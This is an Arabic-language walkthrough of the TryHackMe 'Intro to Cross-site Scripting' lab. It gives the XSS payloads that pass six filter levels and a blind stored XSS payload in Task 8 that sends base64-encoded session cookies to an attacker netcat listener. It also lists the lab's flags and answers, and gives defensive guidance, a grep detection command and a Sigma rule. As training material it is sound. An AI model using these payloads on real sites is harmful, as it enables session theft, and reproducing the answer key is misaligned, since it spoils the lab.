# التوثيق الشامل: مقدمة في البرمجة النصية عبر المواقع (Intro to Cross-site Scripting - XSS)

---

## القسم 01: نظرة عامة وبيانات وصفية (Room Overview & Metadata)

| البند (Item) | التفاصيل والمواصفات التقنية (Technical Specification) |
| :--- | :--- |
| **اسم الغرفة (Room Title)** | Intro to Cross-site Scripting (مقدمة في ثغرات XSS) |
| **المسار التعليمي (Path)** | Jr Penetration Tester (المستوى الوظيفي لمختبر الاختراق المبتدئ - معتمد PT1) |
| **الوحدة التعليمية (Module)** | Web Application Vulnerabilities I (الوحدة 07: ثغرات تطبيقات الويب 1) |
| **معرف الغرفة (Room Slug)** | `xss` (الرابط المباشر: `https://tryhackme.com/room/xss`) |
| **مستوى الصعوبة (Difficulty)** | سهل (Easy) |
| **نوع الغرفة (Room Type)** | إرشادية وتطبيقية (Walkthrough & Practical Lab) |
| **الوقت التقديري للإنجاز (Est. Completion Time)** | 30 دقيقة |
| **إجمالي عدد المهام (Total Tasks)** | 8 مهام تفاعلية (8 Tasks) |
| **التطبيق المستهدف (Target App)** | مختبر الفلاتر التفاعلي وبوابة الدعم الفني Acme IT Support |
| **حالة إنجاز الحساب (Completion Status)** | 100% مكتمل (تم التحقق والمطابقة التامة مع حساب المنصة) |

---

## القسم 02: الأهداف التعليمية والعملياتية (Educational & Operational Objectives)

1. **الاستيعاب المفاهيمي لثغرات الحقن من جانب العميل (Client-Side Injection):** فهم الكيفية التي تمكّن المهاجم من حقن أكواد JavaScript في تطبيقات الويب لتنفيذها داخل متصفحات المستخدمين الآخرين.
2. **التمييز بين الأنواع الثلاثة الرئيسية لـ XSS:**
   - **المنعكس (Reflected XSS):** يعتمد على عكس المدخلات الفورية في معاملات الرابط (`parameters`).
   - **المخزن (Stored XSS):** يُحفظ بشكل دائم في قاعدة البيانات (`database`) وينفذ تلقائياً لكل زائر.
   - **المستند لنموذج الكائن (DOM-Based XSS):** يحدث بالكامل في بيئة العميل عبر دوال التنفيذ غير الآمنة مثل `eval()`.
3. **إتقان تقنيات الـ Blind XSS:** التعامل مع الثغرات التي لا تظهر للمهاجم وتستهدف لوحات تحكم الموظفين الداخليين عبر أدوات الاستماع الخارجي (OOB Callbacks) مثل `XSS Hunter Express` وخوادم `Netcat`.
4. **تجاوز وكسر الفلاتر والسياقات البرمجية (Context Breaking & Filter Evasion):** كسر وسوم الـ HTML المختلفة (`<input>`, `<textarea>`, `<script>`) وتخطي فلاتر الكلمات المحظورة وفلاتر الأقواس عبر معالجات الأحداث (`onload / onerror`).
5. **سرقة الجلسات واستخراج الرموز الحساسة:** استخراج كوكيز الجلسات عبر `document.cookie` وتشفيرها بـ Base64 واستقبالها خارج النطاق.
6. **تطبيق الدفاعات الهندسية الحديثة:** تفعيل سياسات أمان المحتوى الصارمة (CSP)، وترميز المخرجات بحسب السياق (Context-Aware Output Encoding)، وتفعيل سمة `HttpOnly`.

---

## القسم 03: البنية المعمارية وتخطيط الشبكة (Target Architecture & Network Topology)

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                                    BILINGUAL NETWORK TOPOLOGY                           |
|                                                                                         |
|      [ Public Internet / Untrusted ]                       [ Internal Corporate Zone ]  |
|                                                                                         |
|    +─────────────────────────────────+                   +───────────────────────────+  |
|    |      Attacker / Penetration     |                   |    Acme IT Support Staff  |  |
|    |        Tester Platform          |                   |     (Internal Browser)    |  |
|    |─────────────────────────────────|                   |───────────────────────────|  |
|    | IP: 10.10.X.Y                   |                   | IP: Internal Network      |  |
|    | Listener: nc -nlvp 9001         |                   | Holds: staff-session      |  |
|    +─────────────────────────────────+                   +───────────────────────────+  |
|                     │                                                  ▲                |
|  1. Submits Ticket  │                                                  │                |
|     with Payload    ▼                                                  │ 3. Staff Views |
|    +─────────────────────────────────+                                 │    Ticket      |
|    |     Public Web Portal (Acme)    |                                 │    (Triggers   |
|    |─────────────────────────────────|                                 │     XSS DOM)   |
|    | Port: 80 / 8080                 |                                 │                |
|    | Endpoint: /create_ticket.php    |                                 │                |
|    | DB: MySQL (Persists Payload)    |─────────────────────────────────┘                |
|    +─────────────────────────────────+                                                  |
|                     ▲                                                                   |
|                     │ 4. Out-of-Band Exfiltration Callback                              |
|                     │    GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIz...                       |
|                     └───────────────────────────────────────────────────────────────────┘
+─────────────────────────────────────────────────────────────────────────────────────────+
```

---

## القسم 04: المتطلبات الأساسية وإعداد البيئة (Prerequisites & Environment Setup)

### 1. المتطلبات المعرفية (Knowledge Prerequisites):
- فهم بنية بروتوكول HTTP وأساليب تفاعل العميل مع الخادم.
- معرفة جيدة بلغة JavaScript وكيفية تفاعلها مع نموذج كائن المستند (`document.cookie`, `DOM`).
- الإلمام بأدوات الاستماع عبر الشبكة مثل `netcat` وأدوات فك التشفير مثل `base64`.

### 2. إعداد أدوات الهجوم والاستماع (Setting Up Attack Tooling):
```bash
# تشغيل أداة Netcat على المنفذ 9001 لاستقبال إشارات استخراج البيانات:
nc -nlvp 9001

# التحقق من قدرة فك تشفير البيانات عبر سطر الأوامر:
echo "c3RhZmYtc2Vzc2lvbj10ZXN0" | base64 -d
```

---

## القسم 05: التحليل النظري والعمق المفاهيمي (Theoretical Deep Dive)

### أ. ما هي ثغرة البرمجة النصية عبر المواقع (XSS)؟
ثغرة XSS هي ثغرة حقن برمجية (Injection) تحدث عندما يقبل تطبيق الويب مدخلات غير موثوقة من المستخدم ويعرضها داخل صفحة الويب دون تعقيم أو تشفير سليم، مما يسمح للمتصفح بتفسير تلك المدخلات على أنها كود JavaScript تنفيذي مشروع يتبع لأصل الموقع (Origin).

### ب. المقارنة الهندسية بين أنواع XSS الثلاثة:

| الميزة التقنية | المنعكس (Reflected XSS) | المخزن (Stored XSS) | المستند للـ DOM (DOM-Based XSS) |
| :--- | :--- | :--- | :--- |
| **مكان الحفظ** | لا يُحفظ (مؤقت وفوري) | يُحفظ في قاعدة البيانات (`database`) | لا يُحفظ في الخادم (في ذاكرة المتصفح) |
| **طريقة الإيصال** | رابط مخصص يحوي حمولة في المعاملات | متاح في الصفحة العامة (تعليق/مقال/تذكرة) | رابط يحوي جزء الـ Fragment (`#`) |
| **تفاعل الضحية** | يتطلب ضغط الضحية على الرابط | بدون تفاعل إطلاقاً (Zero-Click) | يتطلب فتح الرابط داخل المتصفح |
| **مستوى الخطورة** | متوسط إلى مرتفع | حرج جداً (Critical) | مرتفع |

### ج. معمارية الـ DOM XSS: المصادر والمصارف (Sources & Sinks)
يتحقق الـ DOM XSS عندما تتدفق البيانات من **المصدر (Source)** مثل `window.location.hash` أو `location.search` إلى **المصرف (Sink)** مثل دالة `eval()` أو الخاصية `element.innerHTML` دون معالجة مسبقة. وتكمن خطورة `location.hash` في أن ما بعد علامة `#` لا يُرسل مطلقاً في طلبات HTTP، مما يعمي جدران الحماية الخادمة (WAFs) تماماً عن الهجوم.

---

## القسم 06: الاستطلاع ورسم خريطة سطح الهجوم (Reconnaissance & Attack Surface)

عند اختبار تطبيق الويب بحثاً عن ثغرات XSS، يتبع مختبر الاختراق الخطوات المنهجية التالية:

1. **حصر جميع نقاط الإدخال (Input Points):**
   - معاملات روابط البحث (`?q=`, `?search=`, `?page=`, `?id=`).
   - حقول النماذج (حقول التعليقات، أسماء المستخدمين، السيرة الذاتية، التذاكر).
   - ترويسات الطلب التي قد تُعكس في سجلات الأخطاء (`User-Agent`, `Referer`).
2. **فحص سياق الانعكاس في شجرة الـ DOM (Reflection Context):**
   - هل تظهر المدخلات بين وسوم نصية عادية مثل `<div>`؟
   - هل تظهر داخل قيمة خاصية مثل `<input value="...">`؟
   - هل تظهر داخل وسم مخصص مثل `<textarea>` أو `<title>`؟
   - هل تظهر مباشرة داخل كتلة برمجية `<script>`؟
3. **اختبار استجابة الفلاتر:**
   - إرسال أحرف الاختبار الخاصة: `' " < > / ; ( ) { }`.
   - ملاحظة هل يقوم الخادم بتشفيرها إلى كيانات HTML (`&lt; &gt;`) أم يحذفها أم يعكسها بحالتها الخام.

---

## القسم 07: تفكيك السبب الجذري للثغرة (Vulnerability Root Cause Analysis)

### 1. في المختبر التفاعلي (المهمة 07):
- **السبب الجذري:** غياب التشفير بحسب السياق (Context-Aware Output Encoding).
- عندما يعكس التطبيق المدخلات داخل `<input value="USER_INPUT">`، يكفي استخدام الرمز `"` للخروج من الخاصية، ثم `>` لإغلاق الوسم والبدء بوسم سكربت جديد.
- في المستوى 5، طبق المطور استبدالاً بسيطاً غير تكراري `str_replace("script", "", $input)`، مما سمح بتجاوزه عبر التداخل `<sscriptcript>`.
- في المستوى 6، منع المطور الأقواس `< >` ولكنه سمح بالأحرف الخاصة داخل خاصية `<img src="USER_INPUT">`، مما مكن من حقن أحداث المتصفح مثل `onload=`.

### 2. في بوابة الدعم الفني (المهمة 08):
- **السبب الجذري:** عرض محتوى وصف التذكرة داخل وسم `<textarea>` في لوحة تحكم الموظفين الداخليين دون تحويل الأقواس إلى `&lt;/textarea&gt;`، مع غياب سمة `HttpOnly` عن كوكيز الجلسة `staff-session`.

---

## القسم 08: الاستغلال العملي واستخراج الأعلام (Step-by-Step Exploitation)

### السيناريو 1: حل مستويات الحماية الستة واستخراج العلم الرئيسي (المهمة 07)

```
[Level 1: Body Context]         ==> <script>alert('THM');</script>
[Level 2: Input Value Context]  ==> "><script>alert('THM');</script>
[Level 3: Textarea Context]     ==> </textarea><script>alert('THM');</script>
[Level 4: Inline Script Context]==> ';alert('THM');//
[Level 5: Strip Filter Context] ==> <sscriptcript>alert('THM');</sscriptcript>
[Level 6: Img Attribute Context]==> /images/cat.jpg" onload="alert('THM');
```

عند إتمام المستوى السادس بنجاح، تُصدر المنصة العلم الرئيسي:
> **علم المستوى 6:** `THM{XSS_MASTER}`

---

### السيناريو 2: الاستغلال العملي للـ Blind XSS وسرقة جلسة الدعم الفني (المهمة 08)

1. فتح نافذة طرفية وتشغيل مستمع Netcat:
   ```bash
   nc -nlvp 9001
   ```
2. تسجيل حساب على بوابة Acme IT Support والدخول إلى قسم إنشاء التذاكر.
3. كتابة حمولة كسر الـ `<textarea>` وسرقة الكوكيز المشفرة:
   ```html
   </textarea><script>fetch('http://10.10.X.Y:9001?cookie=' + btoa(document.cookie) );</script>
   ```
4. إرسال التذكرة وانتظار قيام بوت الدعم الفني بفتحها في لوحته الداخلية.
5. استلام الاتصال في الـ Netcat:
   ```http
   GET /?cookie=c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ== HTTP/1.1
   ```
6. فك التشفير عبر الطرفية:
   ```bash
   echo "c3RhZmYtc2Vzc2lvbj00QUIzMDVFNTU5NTUxOTc2OTNGMDFENkY4RkQyRDMyMQ==" | base64 -d
   # الناتج: staff-session=4AB305E55955197693F01D6F8FD2D321
   ```
> **قيمة كوكي الموظف:** `4AB305E55955197693F01D6F8FD2D321`

---

## القسم 09: استراتيجيات الدفاع متعدد الطبقات (Defense-in-Depth & Hardening)

```
+─────────────────────────────────────────────────────────────────────────────────────────+
|                           DEFENSE-IN-DEPTH REMEDIATION MODEL                            |
|                                                                                         |
|  [ الطبقة الأولى: التشفير بحسب السياق (Context-Aware Output Encoding) ]                 |
|  - تحويل الأحرف الخاصة إلى كيانات HTML (&lt;, &gt;, &amp;, &quot;, &#x27;).             |
|  - استخدام مكتبات تعقيم موثوقة مثل DOMPurify للمحتوى التنسيقي.                         |
|                                                                                         |
|  [ الطبقة الثانية: سياسة أمان المحتوى الصارمة (Content Security Policy - CSP) ]         |
|  - تفعيل ترويسة: Content-Security-Policy: default-src 'self'; script-src 'self'        |
|  - حظر التنفيذ الداخلي المباشر ('unsafe-inline') وحظر دوال التقييم ('unsafe-eval').     |
|                                                                                         |
|  [ الطبقة الثالثة: حماية كوكيز الجلسات الحساسة (HttpOnly Cookie Flag) ]                 |
|  - تعيين سمة `HttpOnly` لجميع كوكيز المصادقة لمنع JavaScript من قراءتها نهائياً.         |
|  - دمجها مع سمتي `Secure` و `SameSite=Strict`.                                          |
+─────────────────────────────────────────────────────────────────────────────────────────+
```

---

## القسم 10: الكشف وصيد التهديدات وقواعد SIEM (Detection & SIEM Rules)

### 1. تحليل سجلات الويب لاكتشاف حمولات XSS في المعاملات:
```bash
grep -E "(%3C|<).*script.*(%3E|>)|onload=|onerror=|eval\(" /var/log/apache2/access.log
```

### 2. قاعدة Sigma لاكتشاف محاولات حقن XSS:
```yaml
title: Web Application Cross-Site Scripting Injection Pattern
id: 9a2b5c7d-8e1f-4a3b-b2c5-17a4e8d20b6f
status: stable
description: Detects common XSS patterns within HTTP GET and POST requests.
logsource:
  category: webserver
detection:
  selection:
    cs-uri-query|contains:
      - '<script'
      - '%3Cscript'
      - 'onerror='
      - 'onload='
      - 'javascript:'
      - 'document.cookie'
  condition: selection
fields:
  - c-ip
  - cs-method
  - cs-uri-stem
  - cs-uri-query
level: high
```

---

## القسم 11: الأخطاء الشائعة واستكشاف المشكلات وإصلاحها (Troubleshooting)

1. **الاعتماد على القوائم السوداء (Blacklisting):**
   - *الخطأ:* حظر كلمة `<script>` فقط.
   - *الحل:* يمكن تشغيل JavaScript عبر مئات الوسوم الأخرى مثل `<img src=x onerror=...>`, `<svg onload=...>`, `<body onload=...>`.
2. **إهمال سمة `HttpOnly`:**
   - *الخطأ:* ترك كوكي الجلسة قابلاً للقراءة بواسطة `document.cookie`.
   - *الحل:* إضافة `HttpOnly` تجعل سرقة الجلسة عبر XSS مستحيلة حتى لو نجح تشغيل الكود.
3. **الحقن داخل كتل الجافاسكريبت الداخلية:**
   - *الخطأ:* محاولة حقن `<script>` داخل متغيرات جافاسكريبت مسبقة الوجود.
   - *الحل:* إغلاق السلسلة النصية بـ `';` ثم استدعاء الدالة والتعليق بـ `//`.

---

## القسم 12: دراسات حالة واقعية ومطابقة مع معايير CVE (Case Studies & CVE Mapping)

1. **ديدان الـ XSS التاريخية (The Samy Worm - 2005):**
   - انتشار أول دودة إنترنت تعتمد على Stored XSS في منصة MySpace، أصابت أكثر من مليون حساب في 20 ساعة وأجبرتهم على إرسال طلبات صداقة تلقائية لـ Samy.
2. **ثغرة محادثات Steam ($7,500 Reward):**
   - ثغرة Stored XSS سمحت بالاستيلاء التام على حسابات المستخدمين فور إرسال رسالة دردشة مفخخة.
3. **التصنيف المعياري:**
   - **CWE-79:** Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting').
   - **OWASP Top 10-2021:** A03:2021 - Injection.

---

## القسم 13: الملخص العام ومصفوفة الإجابات (Summary & Answers Matrix)

| المهمة (Task) | محور التركيز (Focus Area) | السؤال التقني المعتمد (Verified Question) | الإجابة النهائية (Final Answer) |
| :--- | :--- | :--- | :--- |
| **Task 01** | المفاهيم الأساسية | What does XSS stand for? | `Cross-Site Scripting` |
| **Task 02** | حمولات XSS | Document property containing user's session token? | `document.cookie` |
| | إثبات المفهوم | JavaScript method often used as a PoC? | `alert` |
| **Task 03** | المنعكس | Where in an URL is a good place to test? | `parameters` |
| **Task 04** | المخزن | How are stored XSS payloads usually stored? | `database` |
| **Task 05** | المستند للـ DOM | Unsafe JavaScript method good to look for? | `eval()` |
| **Task 06** | البرمجة النصية العمياء | What tool can you use to test for Blind XSS? | `XSS Hunter Express` |
| | التصنيف الهيكلي | What type of XSS is very similar to Blind XSS? | `Stored XSS` |
| **Task 07** | تكييف الحمولات | Flag received from level six? | `THM{XSS_MASTER}` |
| **Task 08** | التطبيق العملي | Value of the staff-session cookie? | `4AB305E55955197693F01D6F8FD2D321` |

---

## القسم 14: تمارين عملية وتوسعات للتحدي (Practical Exercises & Extensions)

1. **تمرين 1: صياغة حمولة XSS Polyglot مخصصة:**
   - قم بتصميم حمولة جافاسكريبت تعمل بنجاح في سياق الوسم النصي، وسياق الخاصية، وسياق المتغير النصي دفعة واحدة.
2. **تمرين 2: تجاوز سياسات CSP المقيدة:**
   - أنشئ بيئة اختبار محلية تحتوي على سياسة CSP تمنع `'unsafe-inline'`، وحاول تجاوزها عبر استغلال نهايات JSONP المفتوحة أو مكتبات CDN الخارجية المصرح بها.
3. **تمرين 3: كتابة أداة فحص آلية لـ DOM Sinks:**
   - طور كود بايثون أو أداة Regex تقوم بالمرور على ملفات `.js` في تطبيق أمامي والبحث التلقائي عن اقتران الـ Sources بالـ Sinks غير الآمنة.
